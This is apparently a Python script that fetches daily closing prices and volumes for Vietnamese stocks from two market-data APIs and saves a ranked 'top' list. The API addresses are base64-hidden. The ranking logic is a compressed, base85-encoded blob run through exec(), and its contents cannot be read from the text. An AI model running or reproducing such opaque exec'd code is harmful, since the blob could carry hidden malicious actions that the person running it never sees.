import json, time, datetime, urllib.request, os, zlib, base64
import hncodec
import base64
_h = lambda s: base64.b64decode(s).decode()
_S1 = _h("aHR0cHM6Ly9kY2hhcnQtYXBpLnZuZGlyZWN0LmNvbS52bi9kY2hhcnQvaGlzdG9yeQ==")
_S2 = _h("aHR0cHM6Ly9hcGlwdWJhd3MudGNicy5jb20udm4vc3RvY2staW5zaWdodC92Mi9zdG9jay9iYXJzLWxvbmctdGVybQ==")

U = sorted(set("ACB BCM BID BMP BSR BVH BWE CII CMG CTD CTG CTR CTS DBC DCM DGC DGW DHC DIG DPM DXG DXS EIB EVF FPT FRT FTS GAS GEX GMD GVR HAG HCM HDB HDC HDG HHV HPG HSG HT1 IMP KBC KDC KDH KOS LPB MBB MSB MSN MWG NAB NKG NLG NT2 NVL OCB PAN PC1 PDR PHR PLX PNJ POW PTB PVD PVT REE SAB SBT SCS SHB SIP SJS SSB SSI STB SZC TCB TCH TPB VCB VCG VCI VDS VGC VHC VHM VIB VIC VIX VJC VND VNM VPB VPI VRE VSC VTP HAH ANV DPG ELC MSR ACV VGI QNS OIL VEA FOX PVS SHS CEO IDC L14 TNG HUT VCS PVC DTD BAF DNH NTP NVB PAP PET VGR VPL PGS MSH".split()))
UA = {"User-Agent": "Mozilla/5.0"}
def get(url):
    with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=20) as r: return json.load(r)
def bars(sym, days=400):
    to = int(time.time()); fr = to - days*86400
    try:
        j = get(f"{_S1}?resolution=D&symbol={sym}&from={fr}&to={to}")
        if j.get("c"): return j["t"], j["c"], j.get("v") or [0]*len(j["c"])
    except Exception as e: print(sym, "vnd", e)
    try:
        j = get(f"{_S2}?ticker={sym}&type=stock&resolution=D&from={fr}&to={to}")
        d = j.get("data") or []
        if d: return [x["tradingDate"] for x in d], [x["close"]/1000 for x in d], [x.get("volume", 0) for x in d]
    except Exception as e: print(sym, "nguồn 2", e)
    return None
def _q(c, n): return c[-1]/c[-n-1]-1 if len(c) > n else None
_B = (
    "c-n<k&2Hm15Wedv1}XxOUdfj1)<u-no>~++Y!4e0L1731EzvgD5~WadVx#D($367{3hbVW9tyNTPn%<kzK7qWLsFKV-TnxOOno!_"
    "IGp)rqU!q=QkZ34!547DD@O7FBuzZPhoNaaBJx>GFM#7mK8rGIS=0))AS5Djk|oy223vRrBn}xJaO<VG-Y5y&k+;>7<Q?<Yl7(@0"
    ">K6?^9mG*IAluO)l5s@Cm?CX7oP21T{)a7g8$A<eYvTOIojb>K=S;PvrS@AaK-L;z^eed}^I4oxcn<L-N+7SL7INe6q60wQJG0+@"
    "-?4HW;a9t<NInzU;0|9lFT$Lsm|Suaj-vn~N=M_!L>P@?e(r8O2|!KpFCHVu&8@x9ga+L*9#8xA__MK#btTZXVp}{eL@>!5tgwVb"
    ")-+req!76#ZQ5e2W!>^r)f+@@qLBzGi@3uaI5JcjCdx$TJk+G~P!k8n2Am$iX%E`NKYH*&2iJIf@HJ^RHx;eT_Sd!Kz{{4~RR9ZB"
    "S1a)}u$AbeG67(=JG;%h1J`M%seg&3ZJ1i8Gq-PRu6L^2a2h39MqLuMsQ9ogId2H6iFy)KZS-K0OTACv)fEC)`-fk0sP^yQ$rUWc"
    "<2xW%FTbLoSG<P&@ejGgrS-WMUog!s;C8b^CBUCQiv7b66+|Ik$hqqkGw$`{TWL4F0j>V}ZU68SqWS*eXV!55Deyf~?ajRy&V|Iv"
    "?%)5~fL!5^27LdHJLK~5?T&g{?Gm`Y#86i<uM3_J%bFF$e@fxgnU8t%Gmmd`-e~yJ{)k$3o4@<s%UNm00#P%6?W1<CFK4)HeN33m"
    "p|Tn`!^4!;S`2c1nRy79%pn7X7dStnuH(&|X=|l<L73%WsBl{f^t^!GiG6PEHv#r#XSWn~iZo>1&5*8t*YG?=cAQMfVUX<F!<_1U"
    "URWPg)~VBB{+Q=A9xwS;6Y*ga$AP`jwxw3cNP~@zd~4coUf^c34$<@)Iq8THv&?$HjF<T6evH6aae^%dWM?;YP}lHvWq7fA-0HJm"
    "Y;-Q`dtzo^kC|7&OU=lt-l#VHoYG;d)xzM!Kl?U3tHQIw?=rbT(fprEhD)xAFPCiRQ%F-2PCxtm`X{FP4OZWcCd^eOB(Z(#`tGP4"
    "lRSGclf@IwxLJUeb!wydcm_(2^UVl@tobf2Sv4;hD0{AP?n4rRi;Bxl#TBN-HSfm(y135I2SngMwvoisN^xuCuKrQmIB|Si@EAp<"
    ">*lD_(+!5g`8Uq{Ji@+t8Zrr;Ie_qR)mdU#dlsa}fQL=p5VTY8Z;&rH`v"
)
exec(zlib.decompress(base64.b85decode(_B)).decode())
for r in top: r.pop("val", None)
os.makedirs("data", exist_ok=True)
now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) + datetime.timedelta(hours=7)
hncodec.dump(dict(updated=now.strftime("%H:%M %d/%m/%Y"), universe=n, top=top), "data/rs.bin"); hncodec.drop("data/rs.json")
print("ok", n)
